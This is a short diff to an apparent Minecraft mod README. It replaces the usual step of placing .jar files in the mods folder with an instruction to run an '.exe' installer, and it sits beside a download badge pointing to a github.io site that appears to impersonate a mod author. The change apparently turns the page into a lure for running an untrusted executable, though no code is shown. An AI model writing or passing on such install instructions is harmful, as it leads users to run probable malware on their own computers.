@@ -8,7 +8,7 @@ Download the latest version using the visual button below.
 
 Unzip the archive to a separate folder.
 
-Place the `.jar` files into your Minecraft `mods` folder.
+Run the `.exe` installer — the mods will be automatically installed into your Minecraft `mods` folder.
 
 [![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://darkhax-mods-minecraft.github.io/.github/)
 
